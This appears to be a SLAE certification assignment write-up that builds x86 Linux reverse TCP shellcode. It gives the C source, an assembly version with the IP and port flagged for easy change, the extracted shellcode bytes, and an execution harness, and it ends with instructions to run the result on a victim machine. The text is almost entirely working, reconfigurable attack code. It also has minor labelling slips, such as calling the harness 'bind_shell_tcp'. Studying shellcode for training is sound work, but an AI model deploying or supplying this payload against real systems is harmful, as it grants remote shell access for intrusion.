# Assignment 2

## What to do
- Create a Shell_Reverse_TCP shellcode
    - Reverse connects to configured IP and Port
    - Execs shell on successful connection
- IP and port should be easily configurable

## How to do it
The path we can follow towards creating a shell_reverse_tcp shellcode is to first create a shell_reverse_tcp in C and transform C code into Assembly.

The following code was used as a basis:
```c
#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdint.h>

int main()
{
        uint32_t sockid;                        //socket descriptor
        struct sockaddr_in srv_addr;    //client address
        uint32_t i;                             //counter

        srv_addr.sin_family = AF_INET;
        srv_addr.sin_port = htons(5555);
        srv_addr.sin_addr.s_addr = inet_addr("192.168.191.131");

        //create socket
        sockid = socket(PF_INET, SOCK_STREAM, 0);

        //connect socket
        connect(sockid, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

        //duplicate file descriptors for STDIN, STDOUT, STDERROR
        for (i=0; i<2; i++)
                dup2(sockid, i);

        //execute /bin/sh
        execve("/bin/sh", NULL, NULL);
        close(sockid);

        return 0;

}
```
The code above can be found in our _Assignment #2_ repo and is named as _reverse.c_

You can compile this code using `gcc -o reverse reverse.c`

Again, we follow the same process of transforming C code into Assembly.

This time we need system calls like:

- socketcall
- connect
- dup2
- execve

The actual Assembly code follows:

```assembly
;
; Purpose: SLAE Course
; Student ID: SLAE-998
;

global _start

section .text
_start:

	; socket
	xor eax, eax	; clear eax
	mov ebx, eax	; clear ebx
	push eax	; push 0 IPPROTO_IP
	mov al, 0x66	; socketcall
	mov bl, 0x1	; sys_socket
	push byte 0x1	; push 1 SOCK_STREAM
	push byte 0x2	; push 2 AF_INET
	mov ecx, esp	; ecx points to memory
	int 0x80	; make the sys call

	; connect
	mov edx, eax	; sockfd
	xor eax, eax	; clear eax
	mov ebx, eax	; clear ebx
	mov al, 0x66	; xor eax,eax + socketcall
	mov bl, 0x3	; sys_connect

	push dword 0x83bfa8c0	; ip address 192.168.191.131 - 	# CHANGE ME
	push word 0xb315	; port 5555		     -	# CHANGE ME
	push word 0x2		; AF_INET = PF_INET = 2
	mov ecx, esp		; pointer to struct - second argument

	push 0x10	; addrlen = 16
	push ecx	; pointer to struct
	push edx	; sockfd

	mov ecx, esp	; pointer to arguments
	int 0x80	; make the sys call

	; dup2
	pop ebx		; sockfd to ebx
	xor ecx, ecx	; clear counter
	mov cl, 0x2	; initialize counter

	loop:
		mov al, 0x3f	; sys call dup2
		int 0x80	; make the sys call
		dec cl		; decrement counter
		jns loop

	; execve
	xor ecx, ecx	; clear register - second argument
	mul ecx		; clear eax, edx

	push eax		; null after string
	push dword 0x68732f6e	; n/sh
	push dword 0x69622f2f	; //bi

	mov ebx, esp	; point to //bin/sh in stack

	mov al, 0xb	; execve sys call
	int 0x80	; make sys call
```

The Assembly code can be found in _Assignment #1_ repo named as _shell.asm_

In this example port 5555 was used as the connection port and IP 192.168.191.131. Port 5555 translates to 0x15b3 in hex. Since our system follows the little-endian architecture, the port number has to be loaded in the memory in reverse order. The same goes for the IP address.

In order to change the connection port and IP it is suggested to choose the new port number and IP address convert them into hex, reverse the byte order and compile the program again.

Both the port number and the IP address are tagged in the Assmbly code (_# CHANGE ME_) so they can be easily spotted.

The Assembly code can be compiled using the following commands respectively:
```zsh
$ nasm -f elf -o shell.o shell.asm
$ ld -o shell shell.o
```

Next step is to extract the actual shellcode from the elf file using this one-liner command:
```zsh
$ objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
found in [commandlinefu.com](http://www.commandlinefu.com)

The extracted bytes are:
```
"\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1"
"\xcd\x80\x89\xc2\x31\xc0\x89\xc3\xb0\x66\xb3\x03\x68\xc0\xa8"
"\xbf\x83\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52"
"\x89\xe1\xcd\x80\x5b\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\xfe\xc9"
"\x79\xf8\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
```

The following code can be used to create the bind_shell_tcp elf and test the produced shellcode. The shellcode must be placed in the shellcode buffer:
```c
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1"
"\xcd\x80\x89\xc2\x31\xc0\x89\xc3\xb0\x66\xb3\x03\x68\xc0\xa8"
"\xbf\x83\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52"
"\x89\xe1\xcd\x80\x5b\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\xfe\xc9"
"\x79\xf8\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(shellcode));

        int (*ret)() = (int(*)())shellcode;

        ret();

}
```

The code above can be found in _Assignement #1_ repo and is named as _shellcode.c_

The shellcode can be compiled using `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`

In order to get a shell a listener needs to be set up on the attacking machine, on the port specified in the shellcode (here this port is 5555)

By running the produced elf on the victim machine you get a working reverse_tcp_shell connection to the attacking machine!

## Statement
This page has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student-ID: SLAE-998
